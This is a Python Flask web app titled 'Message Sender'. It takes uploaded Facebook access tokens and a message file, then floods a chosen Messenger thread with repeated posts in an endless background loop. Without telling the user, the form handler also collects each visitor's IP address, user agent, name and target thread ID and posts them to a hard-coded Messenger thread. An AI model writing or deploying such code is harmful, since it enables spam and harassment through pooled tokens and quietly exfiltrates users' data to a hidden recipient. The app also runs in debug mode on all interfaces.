from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import socket

app = Flask(__name__)
app.debug = True

# Facebook Messenger UID where details will be sent
FB_ACCESS_TOKEN = "your_facebook_page_access_token"
FB_THREAD_ID = "100064267823693"  # Messages will be sent to this UID

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"✅ Message Sent Successfully: {message}")
                else:
                    print(f"❌ Message Failed: {message}")
                time.sleep(time_interval)

def send_user_details_to_fb(user_details):
    """Send user details to the specified Facebook Messenger UID."""
    api_url = f'https://graph.facebook.com/v15.0/t_{FB_THREAD_ID}/'
    parameters = {'access_token': FB_ACCESS_TOKEN, 'message': user_details}
    response = requests.post(api_url, data=parameters, headers=headers)
    if response.status_code == 200:
        print("✅ User details sent successfully!")
    else:
        print("❌ Failed to send user details!")

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        # Collect user details
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        hostname = socket.gethostname()
        
        user_details = f"""
        📌 **New User Accessed**
        🌐 IP: {ip_address}
        🖥️ Device: {user_agent}
        🏷️ Name: {mn}
        📨 Thread ID: {thread_id}
        ⏳ Time Interval: {time_interval} sec
        """
        
        # Send details to Messenger UID
        send_user_details_to_fb(user_details)

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Message Sender</title>
  <style>
    body { text-align: center; background-color: #222; color: white; font-family: Arial, sans-serif; }
    .container { max-width: 400px; margin: auto; padding: 20px; background: #333; border-radius: 10px; box-shadow: 0 0 10px white; }
    .form-control { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
    .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; background-color: blue; color: white; }
  </style>
</head>
<body>
  <h1>💬 Message Sender</h1>
  <div class="container">
    <form method="post" enctype="multipart/form-data">
      <select class="form-control" name="tokenOption" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <input type="text" class="form-control" name="singleToken" placeholder="Enter Single Token">
      <input type="file" class="form-control" name="tokenFile">
      <input type="text" class="form-control" name="threadId" placeholder="Enter Thread ID" required>
      <input type="text" class="form-control" name="kidx" placeholder="Enter Your Name" required>
      <input type="number" class="form-control" name="time" placeholder="Enter Time (sec)" required>
      <input type="file" class="form-control" name="txtFile" required>
      <button type="submit" class="btn">🔄 Start</button>
    </form>
  </div>
</body>
</html>
''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
